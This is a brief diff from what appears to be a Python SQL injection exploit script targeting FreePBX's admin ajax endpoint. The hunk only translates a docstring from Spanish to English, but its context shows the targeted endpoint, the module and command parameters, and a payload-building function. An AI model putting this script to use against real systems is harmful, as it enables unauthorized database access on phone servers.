@@ -10,7 +10,7 @@ BASE_ENDPOINT = "/admin/ajax.php"
 
 def build_sql_payload(command: str) -> str:
     """
-    Construye el string de inyección SQL, probando la sintaxis más probable.
+    Construct the SQL injection string, testing the most likely syntax.
     """
     
     base_params = "module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model&brand=x"
